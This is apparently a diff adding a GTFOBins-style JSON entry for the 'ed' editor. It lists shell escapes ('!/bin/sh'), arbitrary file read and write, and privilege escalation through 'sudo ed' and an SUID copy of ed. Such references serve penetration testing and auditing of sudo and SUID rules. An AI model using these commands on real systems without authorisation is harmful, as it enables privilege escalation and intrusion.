@@ -1,0 +1,29 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "ed\n!/bin/sh\n"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "ed [file]\na\nDATA\n.\nw\nq\n"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "ed [file]\n,p\nq\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo ed\n!/bin/sh\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "code": "./ed\n!/bin/sh\n"
+      }
+    ]
+  }
+}
